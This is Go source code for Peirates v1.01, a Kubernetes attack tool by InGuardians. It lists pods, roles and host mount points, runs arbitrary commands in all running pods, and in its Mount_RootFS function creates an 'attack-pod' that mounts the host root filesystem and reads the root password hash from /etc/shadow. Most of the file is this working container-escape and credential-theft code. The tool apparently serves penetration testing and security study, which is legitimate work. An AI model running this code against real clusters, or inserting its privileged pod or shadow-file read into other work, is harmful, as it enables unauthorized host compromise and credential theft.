// Peirates - an Attack tool for Kubernetes clusters
//
// You need to use "package main" for executables
//
// BTW always run `go fmt` before you check in code. go fmt is law.
//
package peirates

// Imports. If you don't use an import that's an error so
// I haven't imported json yet.
// Also, number one rule of Go: Try to stick to the
// standard library as much as possible
import (
	"bytes"
	"encoding/json"
	"flag" // Command line flag parsing
	"fmt"  // String formatting (Printf, Sprintf)
	"io"
	"io/ioutil" // Utils for dealing with IO streams
	"log"       // Logging utils
	"math/rand" // Random module for creating random string building

	// HTTP client/server
	"os/exec"
	"regexp"
	"strings"
	"time" // Time modules

	// kubernetes client
	kubectl "k8s.io/kubernetes/pkg/kubectl/cmd"
)

// get_pod_list returns an array of pod names, parsed from "kubectl get pods"
func get_pod_list(connectionString ServerInfo) []string {

	var pods []string

	getPodsRaw, _, err := runKubectlSimple(connectionString, "get", "pods")
	if err != nil {
		log.Fatal(err)
	}
	// Iterate over kubectl get pods, stripping off the first line which matches NAME and then grabbing the first column

	lines := strings.Split(string(getPodsRaw), "\n")
	for _, line := range lines {
		matched, err := regexp.MatchString(`^\s*$`, line)
		if err != nil {
			log.Fatal(err)
		}
		if !matched {
			//added checking to only enumerate running pods
			if strings.Fields(line)[2] == "Running" {
				pod := strings.Fields(line)[0]
				if pod != "NAME" {
					pods = append(pods, pod)
				}
			}
		}
	}

	return pods
}

// getHostname runs kubectl with connection string to get hostname from pod
func getHostname(connectionString ServerInfo, PodName string) string {
	hostname, _, err := runKubectlSimple(connectionString, "exec", "-it", PodName, "hostname")
	if err != nil {
		fmt.Println("- Checking for hostname of pod "+PodName+" failed: ", err)
		return "- Pod command exec failed for " + PodName + "\n"
	} else {
		return "+ Pod discovered: " + string(hostname)
	}
}

// runKubectl executes the kubectl library internally, allowing us to use the
// Kubernetes API and requiring no external binaries.
//
// runKubectl takes and io.Reader and two io.Writers, as well as a command to run in cmdArgs.
// The kubectl library will read from the io.Reader, representing stdin, and write its stdout and stderr via the corresponding io.Writers.
//
// runKubectl returns an error string, which indicates internal kubectl errors.
//
// NOTE: You should generally use runKubectlSimple(), which calls runKubectlWithConfig, which calls this.
func runKubectl(stdin io.Reader, stdout, stderr io.Writer, cmdArgs ...string) error {
	// Based on code from https://github.com/kubernetes/kubernetes/blob/2e0e1681a6ca7fe795f3bd5ec8696fb14687b9aa/cmd/kubectl/kubectl.go#L44

	// NewKubectlCommand adds the global flagset for some reason, so we have to
	// copy it, temporarily replace it, and then restore it.
	oldFlagSet := flag.CommandLine
	flag.CommandLine = flag.NewFlagSet("kubectl", flag.ContinueOnError)
	cmd := kubectl.NewKubectlCommand(stdin, stdout, stderr)
	flag.CommandLine = oldFlagSet
	cmd.SetArgs(cmdArgs)
	return cmd.Execute()
}

// runKubectlWithConfig takes a server config, and a list of arguments. It executes kubectl internally,
// setting the namespace, token, certificate authority, and server based on the provided config, and
// appending the supplied arguments to the end of the command.
//
// NOTE: You should generally use runKubectlSimple() to call this.
func runKubectlWithConfig(cfg ServerInfo, stdin io.Reader, stdout, stderr io.Writer, cmdArgs ...string) error {
	connArgs := []string{
		"-n", cfg.Namespace,
		"--token=" + cfg.Token,
		"--certificate-authority=" + cfg.CAPath,
		"--server=https://" + cfg.RIPAddress + ":" + cfg.RPort,
	}
	return runKubectl(stdin, stdout, stderr, append(connArgs, cmdArgs...)...)
}

// runKubectlSimple executes runKubectlWithConfig, but supplies nothing for stdin, and aggregates
// the stdout and stderr streams into byte slices. It returns (stdout, stderr, execution error).
//
// NOTE: This function is what you want to use most of the time, rather than runKubectl() and runKubectlWithConfig().
func runKubectlSimple(cfg ServerInfo, cmdArgs ...string) ([]byte, []byte, error) {
	stdin := strings.NewReader("")
	stdout := bytes.Buffer{}
	stderr := bytes.Buffer{}

	err := runKubectlWithConfig(cfg, stdin, &stdout, &stderr, cmdArgs...)

	return stdout.Bytes(), stderr.Bytes(), err
}

// canCreatePods() runs kubectl to check if current token can create a pod
func canCreatePods(connectionString ServerInfo) bool {
	canCreateRaw, _, err := runKubectlSimple(connectionString, "auth", "can-i", "create", "pod")
	if err != nil {
		return false
	} else {
		if strings.Contains(string(canCreateRaw), "yes") {
			return true
		} else {
			return false
		}
	}

}

// inAPod() runs mount on the local system and then checks if output contains kubernetes
// TODO: Change mount to use a Go function to read /etc/mtab
func inAPod(connectionString ServerInfo) bool {
	mount_output_bs, err := exec.Command("mount").Output()
	if err != nil {
		fmt.Println("Checking if we are running in a Pod failed: ", err)
		return false
	} else {
		mount_output := string(mount_output_bs)
		return strings.Contains(mount_output, "kubernetes")
	}

}

// execInAllPods() runs kubeData.command in all running pods
func execInAllPods(connectionString ServerInfo, command string) {
	runningPods := get_pod_list(connectionString)
	for _, execPod := range runningPods {
		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/bash", "-c", command)
		if err != nil {
			fmt.Println("- Executing "+command+" in Pod "+execPod+" failed: ", err)
		} else {
			fmt.Println("+ Executing " + command + " in Pod " + execPod + " succeded: ")
			fmt.Println("\t" + string(execInPodOut))
		}
	}

}

// execInListPods() runs kubeData.command in all pods in kubeData.list
func execInListPods(connectionString ServerInfo, pods []string, command string) {
	fmt.Println("+ Running supplied command in list of pods")
	for _, execPod := range pods {

		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/bash", "-c", command)
		if err != nil {
			fmt.Println("- Executing "+command+" in Pod "+execPod+" failed: ", err)
		} else {
			fmt.Println("+ Executing " + command + " in Pod " + execPod + " succeded: ")
			fmt.Println("\t" + string(execInPodOut))
		}
	}

}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Added mountFS code to create yaml file drop to disk and create a pod.    |
//--------------------------------------------------------------------------|

// randSeq generates a LENGTH length string of random lowercase letters.
func randSeq(length int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyz")
	b := make([]rune, length)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// Used by mount_rootfs
type Mount_Info struct {
	yaml_build string
	image      string
	namespace  string
}

// Used for JSON parsing
type Kube_Roles struct {
	APIVersion string `json:"apiVersion"`
	Items      []struct {
		APIVersion string `json:"apiVersion"`
		Kind       string `json:"kind"`
		Metadata   struct {
			Annotations struct {
				KubectlKubernetesIoLastAppliedConfiguration string `json:"kubectl.kubernetes.io/last-applied-configuration"`
			} `json:"annotations"`
			CreationTimestamp time.Time `json:"creationTimestamp"`
			Name              string    `json:"name"`
			Namespace         string    `json:"namespace"`
			ResourceVersion   string    `json:"resourceVersion"`
			SelfLink          string    `json:"selfLink"`
			UID               string    `json:"uid"`
		} `json:"metadata"`
		Rules []struct {
			APIGroups []string `json:"apiGroups"`
			Resources []string `json:"resources"`
			Verbs     []string `json:"verbs"`
		} `json:"rules"`
	} `json:"items"`
	Kind     string `json:"kind"`
	Metadata struct {
		ResourceVersion string `json:"resourceVersion"`
		SelfLink        string `json:"selfLink"`
	} `json:"metadata"`
}

// Populated by GetPodsInfo (JSON parsing from kubectl get pods)
type Pod_Details struct {
	APIVersion string `json:"apiVersion"`
	Items      []struct {
		APIVersion string `json:"apiVersion"`
		Kind       string `json:"kind"`
		Metadata   struct {
			Annotations struct {
				KubectlKubernetesIoLastAppliedConfiguration string `json:"kubectl.kubernetes.io/last-applied-configuration"`
			} `json:"annotations"`
			CreationTimestamp time.Time `json:"creationTimestamp"`
			Labels            struct {
				App string `json:"app"`
			} `json:"labels"`
			Name            string `json:"name"`
			Namespace       string `json:"namespace"`
			ResourceVersion string `json:"resourceVersion"`
			SelfLink        string `json:"selfLink"`
			UID             string `json:"uid"`
		} `json:"metadata"`
		Spec struct {
			Containers []struct {
				Image           string `json:"image"`
				ImagePullPolicy string `json:"imagePullPolicy"`
				Name            string `json:"name"`
				Ports           []struct {
					ContainerPort int    `json:"containerPort"`
					Protocol      string `json:"protocol"`
				} `json:"ports"`
				Resources struct {
				} `json:"resources"`
				TerminationMessagePath   string `json:"terminationMessagePath"`
				TerminationMessagePolicy string `json:"terminationMessagePolicy"`
				VolumeMounts             []struct {
					MountPath string `json:"mountPath"`
					Name      string `json:"name"`
					ReadOnly  bool   `json:"readOnly"`
				} `json:"volumeMounts"`
			} `json:"containers"`
			DNSPolicy    string `json:"dnsPolicy"`
			NodeName     string `json:"nodeName"`
			NodeSelector struct {
				KubernetesIoHostname string `json:"kubernetes.io/hostname"`
			} `json:"nodeSelector"`
			RestartPolicy   string `json:"restartPolicy"`
			SchedulerName   string `json:"schedulerName"`
			SecurityContext struct {
			} `json:"securityContext"`
			ServiceAccount                string `json:"serviceAccount"`
			ServiceAccountName            string `json:"serviceAccountName"`
			TerminationGracePeriodSeconds int    `json:"terminationGracePeriodSeconds"`
			Tolerations                   []struct {
				Effect            string `json:"effect"`
				Key               string `json:"key"`
				Operator          string `json:"operator"`
				TolerationSeconds int    `json:"tolerationSeconds"`
			} `json:"tolerations"`
			Volumes []struct {
				HostPath struct {
					Path string `json:"path"`
					Type string `json:"type"`
				} `json:"hostPath,omitempty"`
				Name   string `json:"name"`
				Secret struct {
					DefaultMode int    `json:"defaultMode"`
					SecretName  string `json:"secretName"`
				} `json:"secret,omitempty"`
			} `json:"volumes"`
		} `json:"spec"`
		Status struct {
			Conditions []struct {
				LastProbeTime      interface{} `json:"lastProbeTime"`
				LastTransitionTime time.Time   `json:"lastTransitionTime"`
				Status             string      `json:"status"`
				Type               string      `json:"type"`
			} `json:"conditions"`
			ContainerStatuses []struct {
				ContainerID string `json:"containerID"`
				Image       string `json:"image"`
				ImageID     string `json:"imageID"`
				LastState   struct {
					Terminated struct {
						ContainerID string    `json:"containerID"`
						ExitCode    int       `json:"exitCode"`
						FinishedAt  time.Time `json:"finishedAt"`
						Reason      string    `json:"reason"`
						StartedAt   time.Time `json:"startedAt"`
					} `json:"terminated"`
				} `json:"lastState"`
				Name         string `json:"name"`
				Ready        bool   `json:"ready"`
				RestartCount int    `json:"restartCount"`
				State        struct {
					Running struct {
						StartedAt time.Time `json:"startedAt"`
					} `json:"running"`
				} `json:"state"`
			} `json:"containerStatuses"`
			HostIP    string    `json:"hostIP"`
			Phase     string    `json:"phase"`
			PodIP     string    `json:"podIP"`
			QosClass  string    `json:"qosClass"`
			StartTime time.Time `json:"startTime"`
		} `json:"status"`
	} `json:"items"`
	Kind     string `json:"kind"`
	Metadata struct {
		ResourceVersion string `json:"resourceVersion"`
		SelfLink        string `json:"selfLink"`
	} `json:"metadata"`
}

// GetPodsInfo() gets details for all pods in json output and stores in Pod_Details struct
func GetPodsInfo(connectionString ServerInfo, podDetails *Pod_Details) {
	fmt.Println("+ Getting details for all pods")
	podDetailOut, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "json")
	if err != nil {
		fmt.Println("- Unable to retrieve details from this pod: ", err)
	} else {
		fmt.Println("+ Retrieving details for all pods was successful: ")
		err := json.Unmarshal(podDetailOut, &podDetails)
		if err != nil {
			fmt.Println("- Error unmarshaling data: ", err)
		}
	}
}

// GetHostMountPoints prints all pods' host volume mounts parsed from the Spec.Volumes pod spec by GetPodsInfo()
func GetHostMountPoints(podInfo Pod_Details) {
	fmt.Println("+ Getting all host mount points")
	for _, item := range podInfo.Items {
		fmt.Println("+ Host Mount Points for Pod: " + item.Metadata.Name)
		for _, volume := range item.Spec.Volumes {
			if volume.HostPath.Path != "" {
				fmt.Println("\tHost Mount Point: " + string(volume.HostPath.Path))
			}
		}
	}
}

// GetHostMountPointsForPod prints a single pod's host volume mounts parsed from the Spec.Volumes pod spec by GetPodsInfo()
func GetHostMountPointsForPod(podInfo Pod_Details, pod string) {
	fmt.Println("+ Getting all Host Mount Points only for pod: " + pod)
	for _, item := range podInfo.Items {
		if item.Metadata.Name == pod {
			for _, volume := range item.Spec.Volumes {
				if volume.HostPath.Path != "" {
					fmt.Println("\tHost Mount Point: " + string(volume.HostPath.Path))
				}
			}
		}
	}
}

// GetRoles() enumerates all roles in use on the cluster (in the default namespace).
// It parses all roles into a Kube_Roles object.
func GetRoles(connectionString ServerInfo, kubeRoles *Kube_Roles) {
	fmt.Println("+ Getting all Roles")
	rolesOut, _, err := runKubectlSimple(connectionString, "get", "role", "-o", "json")
	if err != nil {
		fmt.Println("- Unable to retrieve roles from this pod: ", err)
	} else {
		fmt.Println("+ Retrieving roles was successful: ")
		err := json.Unmarshal(rolesOut, &kubeRoles)
		if err != nil {
			fmt.Println("- Error unmarshaling data: ", err)
		}

	}
}

func Mount_RootFS(all_pods_listme []string, connectionString ServerInfo) {
	var Mount_InfoVars = Mount_Info{}
	// fmt.Println("DEBUG: grabbing image from pod: ", string(all_pods_listme[3]))
	//Get pods
	//# Get the first pod from all_pod_listme
	//pod_to_examine = all_pod_listme[0]

	//# Run a kubectl command to get YAML
	//yaml_output = kubectl -n ...  --token .... --ca ... get pod $pod_to_examine -o yaml

	//# Parse yaml output to get the image name
	//image_name = `grep "- image" yaml_output | awk '{print $3}'`

	// We take the most recent deployment's image
	// TODO: parse this via JSON
	// TODO: check that image exists / handle failure by trying again with the next youngest deployment's image or a named deployment's image
	get_images_raw, _, err := runKubectlSimple(connectionString, "get", "deployments", "-o", "wide", "--sort-by", "metadata.creationTimestamp")

	get_image_lines := strings.Split(string(get_images_raw), "\n")
	for _, line := range get_image_lines {
		matched, err := regexp.MatchString(`^\s*$`, line)
		if err != nil {
			log.Fatal(err)
		}
		if !matched {
			//added checking to only enumerate running pods
			Mount_InfoVars.image = strings.Fields(line)[7]
			fmt.Println("[+] This is the Mount_InfoVars.Image output: ", Mount_InfoVars.image)
		}
	}

	if err != nil {
		log.Fatal(err)
	}

	//creat random string
	random_string := randSeq(6)

	// Create Yaml File
	Mount_InfoVars.yaml_build = fmt.Sprintf(`apiVersion: v1
kind: Pod
metadata:
  annotations:
  labels:
  name: attack-pod-%s
  namespace: %s
spec:
  containers:
  - image: %s
    imagePullPolicy: IfNotPresent
    name: attack-container
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
`, random_string, connectionString.Namespace, Mount_InfoVars.image)

	// Write yaml file out to current directory
	ioutil.WriteFile("attack-pod.yaml", []byte(Mount_InfoVars.yaml_build), 0700)

	_, _, err = runKubectlSimple(connectionString, "apply", "-f", "attack-pod.yaml")
	if err != nil {
		log.Fatal(err)
	} else {
		attack_pod_name := "attack-pod-" + random_string
		println("Executing code in " + attack_pod_name + " to get its underlying host's root password hash")
		time.Sleep(2 * time.Second)
		shadow_file_bs, _, err := runKubectlSimple(connectionString, "exec", "-it", attack_pod_name, "grep", "root", "/root/etc/shadow")
		if err != nil {
			log.Fatal(err)
		} else {
			println(string(shadow_file_bs))
		}
	}
	//out, err = exec.Command("").Output()
	//if err != nil {
	//	fmt.Println("Token location error: ", err)
	//}
	//fmt.Println(out)
}

//------------------------------------------------------------------------------------------------------------------------------------------------

func PeiratesMain() {

	// Create a global variable named "connectionString" initialized to
	// default values
	connectionString := ParseLocalServerInfo()
	cmdOpts := CommandLineOptions{connectionConfig: connectionString}
	var kubeRoles Kube_Roles
	var podInfo Pod_Details
	//kubeData.arg =""
	//kubeData.list = {}

	// Run the option parser to initialize connectionStrings
	println(`Peirates
	________________________________________
	|  ___  ____ _ ____ ____ ___ ____ ____ |
	|  |__] |___ | |__/ |__|  |  |___ [__  |
	|  |    |___ | |  \ |  |  |  |___ ___] |
	|______________________________________|
	,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
	,,,,,,,,,,,,,.............:,,,,,,,,,,,,,
	,,,,,,,,,,...,IIIIIIIIIII+...,,,,,,,,,,,
	,,,,,,,:..~IIIIIIIIIIIIIIIIII...,,,,,,,,
	,,,,,,..?IIIIIII.......IIIIIIII..,,,,,,,
	,,,,,..IIIIIIII...II?...?IIIIIII,..,,,,,
	,,,:..IIIIIIII..:IIIIII..?IIIIIIII..,,,,
	,,,..IIIIIIIII..IIIIIII...IIIIIIII7.:,,,
	,,..IIIIIIIII.............IIIIIIIII..,,,
	,,.=IIIIIIII...~~~~~~~~~...IIIIIIIII..,,
	,..IIIIIIII...+++++++++++,..+IIIIIII..,,
	,..IIIIIII...+++++++++++++:..~IIIIII..,,
	,..IIIIII...++++++:++++++++=..,IIIII..,,
	,..IIIII...+....,++.++++:+.++...IIII..,,
	,,.+IIII...+..,+++++....+,.+...IIIII..,,
	,,..IIIII...+++++++++++++++...IIIII..:,,
	,,,..IIIII...+++++++++++++...IIIII7..,,,
	,,,,.,IIIII...+++++++++++...?IIIII..,,,,
	,,,,:..IIIII...............IIIII?..,,,,,
	,,,,,,..IIIII.............IIIII..,,,,,,,
	,,,,,,,,..7IIIIIIIIIIIIIIIII?...,,,,,,,,
	,,,,,,,,,:...?IIIIIIIIIIII....,,,,,,,,,,
	,,,,,,,,,,,,:.............,,,,,,,,,,,,,,
	,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
	,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
	________________________________________`)

	println("\n\nPeirates v1.01 by InGuardians")
	println("https://www.inguardians.com/labs/\n")
	parseOptions(&cmdOpts)

	if inAPod(connectionString) {
		println("+ You are in a pod.")
	} else {
		println("- You are not in a Kubernetes pod.")
	}

	all_pods := get_pod_list(connectionString)

	GetRoles(connectionString, &kubeRoles)

	GetPodsInfo(connectionString, &podInfo)
	GetHostMountPoints(podInfo)
	GetHostMountPointsForPod(podInfo, "attack-daemonset-6fmjc")
	for _, pod := range all_pods {
		// JAY / TODO: Put me back
		println("Checking out hostname for: " + pod)
		print(getHostname(connectionString, pod))
	}

	pod_creation := canCreatePods(connectionString)
	if pod_creation {
		println("+ This token can create pods on the cluster")
	} else {
		println(" This token cannot create pods on the cluster")
	}

	Mount_RootFS(all_pods, connectionString)

	if cmdOpts.commandToRunInPods != "" {
		if len(cmdOpts.podsToRunTheCommandIn) > 0 {
			execInListPods(connectionString, cmdOpts.podsToRunTheCommandIn, cmdOpts.commandToRunInPods)
		} else {
			execInAllPods(connectionString, cmdOpts.commandToRunInPods)
		}
	}
}
